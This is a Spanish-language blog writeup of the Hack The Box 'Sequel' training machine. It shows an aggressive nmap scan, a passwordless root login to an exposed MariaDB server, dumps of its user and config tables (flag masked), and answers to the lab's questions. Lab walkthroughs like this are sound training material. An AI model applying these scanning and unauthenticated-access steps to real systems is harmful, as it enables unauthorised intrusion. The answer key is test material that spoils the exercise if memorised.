---
title: HTB - Starting Point - Tier 1 - Sequel Writeup
date: 2022-08-10 09:10:00 +0800
categories: [HTB, Writeup]
tags: [htb, writeups]     # TAG names should always be lowercase
---

Este post forma parte de la serie **Tier 1** del **Starting Point** de [HTB](https://app.hackthebox.com/starting-point) que iniciamos [aquí]({% post_url 2022-08-10-htb-writeup-tier1-appointment %}).

## Sequel

El primer paso será iniciar la máquina (para lo que previamente tendremos que tener establecida nuestra conexión VPN)

![](/assets/posts/20220810/img08.png)

Las tags de este box no dan varias pistas de por donde van los tiros.

Copiamos la IP del equipo remoto, en mi caso *10.129.217.57*, y lanzamos un **nmap**.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]
└─$ nmap -A 10.129.217.57 -oN nmap_output
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-09 20:16 CEST
Nmap scan report for 10.129.217.57
Host is up (0.086s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
|_sslv2: ERROR: Script execution failed (use -d to debug)
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 84
|   Capabilities flags: 63486
|   Some Capabilities: SupportsCompression, ConnectWithDatabase, Support41Auth, FoundRows, InteractiveClient, Speaks41ProtocolOld, ODBCClient, SupportsTransactions, LongColumnFlag, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, IgnoreSigpipes, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: >Rd~p4Pu!>TnMrx&PB;>
|_  Auth Plugin Name: mysql_native_password
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 204.38 seconds
```

Significado de las flags:

* `-A`&nbsp;: escaneo completo (aka agresivo) que ejecuta OS detection, version detection, script scanning y traceroute todo del tirón.
* `-oN`&nbsp;: imprime la salida en un fichero de texto con el nombre *nmap_output*

OK. Tenemos un servicio *mysql* escuchando en el puerto *3306/tcp*, concretamente una *5.5.5-10.3.27-MariaDB-0+deb10u1*

Iniciamos nuestro cliente **mysql** en local, con *root* como usuario y sin contraseña, y nos ponemos a trastear.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/HTB/Tier1]
└─$ mysql -h 10.129.217.57 -u root
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 77
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.041 sec)

MariaDB [(none)]> use htb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.038 sec)

MariaDB [htb]> select * FROM users;
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
4 rows in set (0.039 sec)

MariaDB [htb]> select * FROM config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.038 sec)

MariaDB [htb]>
```

Bingo !

## Respuestas:

* <strong>Task 1</strong>: Structured Query Language
* <strong>Task 2</strong>: 3306
* <strong>Task 3</strong>: MariaDB
* <strong>Task 4</strong>: -u
* <strong>Task 5</strong>: root
* <strong>Task 6</strong>: *
* <strong>Task 7</strong>: ;

